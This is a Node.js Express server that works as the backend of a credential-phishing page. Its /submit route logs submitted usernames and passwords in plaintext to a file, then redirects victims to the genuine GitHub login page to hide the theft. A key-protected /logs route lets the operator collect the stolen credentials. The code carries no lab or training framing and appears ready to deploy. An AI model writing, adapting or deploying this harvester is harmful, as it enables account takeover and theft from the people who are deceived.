const express = require("express");
const fs = require("fs");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;
const LOG_FILE = path.join(__dirname, "submissions.log");
const LOG_API_KEY = process.env.LOG_API_KEY || "change-this-secret-key";

app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

app.post("/submit", (req, res) => {
    const username = req.body.username || "";
    const password = req.body.password || "";

    const entry = `Username: ${username}\nPassword: ${password}\n\n`;
    fs.appendFile(LOG_FILE, entry, (err) => {
        if (err) {
            return res.status(500).send("Error saving submission");
        }
        res.redirect("https://github.com/login");
    });
});

app.get("/logs", (req, res) => {
    const providedKey = req.header("x-api-key");
    if (!providedKey || providedKey !== LOG_API_KEY) {
        return res.status(401).send("Unauthorized");
    }

    if (!fs.existsSync(LOG_FILE)) {
        return res.type("text/plain").send("");
    }

    res.type("text/plain").sendFile(LOG_FILE);
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});